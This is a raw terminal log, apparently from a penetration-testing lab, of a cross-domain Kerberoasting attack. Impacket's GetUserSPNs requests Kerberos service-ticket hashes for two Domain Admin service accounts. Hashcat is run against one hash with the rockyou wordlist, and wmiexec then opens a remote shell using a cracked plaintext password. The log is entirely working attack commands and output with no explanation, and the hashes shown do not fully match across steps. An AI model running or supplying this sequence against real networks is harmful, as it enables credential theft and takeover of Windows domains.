```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               



$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$02076a392a14ddbc729d4894c2de30be$d59ba0097555aa343c119d49b516ee7622c5aa4c8b24de4068ef0321958d2ed954abbe517bcb83a76287487fb28d963765e1996c0e3f7d9b1df3e9dd6908f0d155417ae864d6c12849ae956f216532a15d78485649f8eddf3c019a013ce6b4bbff9fbac73cdd5284f6e89f91ee8bf776fe84d4fd368ac9ec420d965627679253cbaf73b71dc81ce22a61624729b86e32bfcbc2d1e1c8cf8cb358451432fa3b8c48987db9e47440f5c9d38280e139fd8ec2e639ee43b2c3b7418f8ec1e8f6bfa26caedc596cb4575f624e96cd540d7ba78dd7d81af91f2690d0194eab5e3a443e78be99369ff7205d60c5cee695df394ebd4ffd67013f994ed6ebf98509f926199dad0a6c2386cf8ea4ee31dc96225e1d1d327e83599417bf73b256ed0baddc131207b4e916b5b3e739ec778976835c040f57747050b92e5cf502695c1333e5b0fdac60e99272ef5ff693abe7742fb6df4d0ee8d212f49b1619db39387535b3d9d24725f959454e430fb1e2829c531c463e09cc82cebdc6a564006ee203700ceb24bfbdaf969e9154ab8e78afdc3861a4b71640485ff33d82e102e934fda24beb69080d79545830829180ed709c7928142d52693020f73f9cf2c7abbb5b966c16cc038920cef5f9be341fbd981cc7bb6da7d026f4bdcde8c0e57d9df7453e8869b495731f65a256dcb613f99bdbe5e58dc7641e9bb66212e446c4b6670da66b3ecc0f9094d0093349585f436afa6ef2ed3602d9c94b9b0e2dc14209cfda2fbaf457d86350466c84647b646998a505723866cdb3cecfeaa32165d3e59c39864c05b3ae41a8b219637e96c22c6bfe0855c3c6effc3d5f2a9c1415f29aa1614915e7cee6f432000638bc0caa272240791049908ee08addc547f78dbdcfdeadfb36e580823b821eb1b4e1fcee77124993626dc47b4e1eed4c4498863112a76a96101e89fd9a3ce99277d461e593f4e87dc2f0f9b356f81cef02b15f0462bbb1b0e99eb8dfa35f2be9385cbf80729cf5817f9ca9de91171e3ec1bf8b13575cc933b5945141c880a1eef775c66a920602e4d62a7b40b3c9a08ec1b0a58c87fc2b4af8b7fcad157e6cdbb6dbc08866abe28463fe54122e456e7b85f71cfa746d5a787ad77436a95d781e5f703c3ed8b645b2fe84190c8495019806da37822a097acd75ccf84b74709ad0657e72aa163d63d401ea09a46e3183c028254a0c4e60abd3154e6a05118541943a9bf5d1fbec8cc6488a3cc676e02813d807474f67f469f69ae570d6f4d62e880b8f0ab1c619542cd0e3a99b873d5d194671afdcb043bbbca88402651f4a855f9691f239ecc683d99fd0a7ac04c29ff1d204c2832d6567744cd347ad75341ef2b80ef10fe5beac6dd0a09a4695b5bdabf84c4e1d7a35e539ee510760773943e0e5c40b96c9aa8577d5be47100c9b7679b0fc951eb6a826fd7d279651f2c911f0760e
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$66531236c2d42a81d83d5d7c6425032b$e6b5c3f20a15b28de623cdb5edb45335ea0d253deae704dc5ce6a9356355cb8b76233e147ad75caf58e411e420a2803c542869c8d6680ddbf80ca8ba96b58f9c1376fa82132ab579643e243713f3b56b2468b5c34f85c1c8abc3bde11bf1c08ff84a61fa7e12c7e13ed8352b414009fc052fd1cdc5a4442296f5fb10c03dfaaea424b7f1f1115f5a8752338768d5925c29706f9b82108512c45fd02c392c778087d3c35e1f6935cf9002e67c33857297711c8a2ba9777c9634e654116a6e41759d0d449baefbe63ee79d2f87f5f98f8b091b9e851417c29ed1c7cf7d39928349aa832fcb8c6973f2c7e0f8146e62ca0b64088e6f21d26824941ad736332aa9e1eba7317c36158f1fef72f4af0ce1bc90f6d559e9ea53f2f34d436a651aa0f2324f2bbff45d0ceb35ae1f994c3b8456e52c69d817c1853b39ba3254cc29cd4d9e152258a12ed2e09e5e07d2e7a8b9ace143ff15308920d585a2cc0fb39d86350ba5ef255aa1e267440d6c24a37a1701f915a07a72664dc575000d9c9ebc6e0411f0e89c95e1c7c0afea0ad0de79da7dfb19fa97cf94caa5309bbf99aa8c34adc6eebdde771867ea5ee795def0a903c3e127c252a53569cf7a8214e9e93323e15bdc9fa238bee8c1e97db585a0ab9aee5c3f0d47ab16a2ea0a6f92b9a016426a72708db22d6f5dff4842a87a2ec94ae663a1cd2ef5c0268690c51ee581077e7dd248b03d14bc7107ec0ef2ce4d54e311335ae23006b81711d9a20f968f0b47512dee463d354ebe7d2cd09b6adc43b9dffa0136857e76a5e2a235006f5a32b98d6853e6a093e3ac20543b950160fa6def07a455855f28620c952c4059490b35ce9e85bbd8b31c6d1f8e764b951a0b4f9c7f807a04de2238e1af25f049ab76879099e98ee1643e303e92e584bb8e950a5ad683f1200cca7a6bd2ca1e55e1ff2ffe8c92e84394828404e11068b2f4f93b703f487812f02e73664fb700df9fcc95a313ff266ecd5bdcb5e3904e07c56e23b5008023528b356c9b1383152f86fc9b959d
```

```
hashcat -m 13100 sapsso /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1392 MB free)

Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$66531236c2d42a81d83d5d7c6425032b$e6b5c3f20a15b28de623cdb5edb45335ea0d253deae704dc5ce6a9356355cb8b76233e147ad75caf58e411e420a2803c542869c8d6680ddbf80ca8ba96b58f9c1376fa82132ab579643e243713f3b56b2468b5c34f85c1c8abc3bde11bf1c08ff84a61fa7e12c7e13ed8352b414009fc052fd1cdc5a4442296f5fb10c03dfaaea424b7f1f1115f5a8752338768d5925c29706f9b82108512c45fd02c392c778087d3c35e1f6935cf9002e67c33857297711c8a2ba9777c9634e654116a6e41759d0d449baefbe63ee79d2f87f5f98f8b091b9e851417c29ed1c7cf7d39928349aa832fcb8c6973f2c7e0f8146e62ca0b64088e6f21d26824941ad736332aa9e1eba7317c36158f1fef72f4af0ce1bc90f6d559e9ea53f2f34d436a651aa0f2324f2bbff45d0ceb35ae1f994c3b8456e52c69d817c1853b39ba3254cc29cd4d9e152258a12ed2e09e5e07d2e7a8b9ace143ff15308920d585a2cc0fb39d86350ba5ef255aa1e267440d6c24a37a1701f915a07a72664dc575000d9c9ebc6e0411f0e89c95e1c7c0afea0ad0de79da7dfb19fa97cf94caa5309bbf99aa8c34adc6eebdde771867ea5ee795def0a903c3e127c252a53569cf7a8214e9e93323e15bdc9fa238bee8c1e97db585a0ab9aee5c3f0d47ab16a2ea0a6f92b9a016426a72708db22d6f5dff4842a87a2ec94ae663a1cd2ef5c0268690c51ee581077e7dd248b03d14bc7107ec0ef2ce4d54e311335ae23006b81711d9a20f968f0b47512dee463d354ebe7d2cd09b6adc43b9dffa0136857e76a5e2a235006f5a32b98d6853e6a093e3ac20543b950160fa6def07a455855f28620c952c4059490b35ce9e85bbd8b31c6d1f8e764b951a0b4f9c7f807a04de2238e1af25f049ab76879099e98ee1643e303e92e584bb8e950a5ad683f1200cca7a6bd2ca1e55e1ff2ffe8c92e84394828404e11068b2f4f93b703f487812f02e73664fb700df9fcc95a313ff266ecd5bdcb5e3904e07c56e23b5008023528b356c9b1383152f86fc9b959dd3deb5abd2ca0ebf842f3b6ffafc615ed5a8ae6bba19a1f6bdfb802e44ff8ec121dbc5cc6d82e583bd389efb34caea8187e0b294aa859dba7367fbd4c85b71e5f8dcfc2b80967ea244099059afa599b1ed861b73ad707957ac966c9690612002a616ec44c9ba46b21890c4455647a1ecf9a5c16a7271031214fc80bcf67652d6dbde9a54417fec8021ecad30da8875261bfab3899982719dcabe3f67af3805ac71278a7beb9440dfab78dc02622ab65dd6a38ada664c43a5edcff014cf8c0582
```

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $wmiexec.py FREIGHTLOGISTICS.LOCAL/sapsso:'pabloPICASSO'@172.16.5.238
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands


```

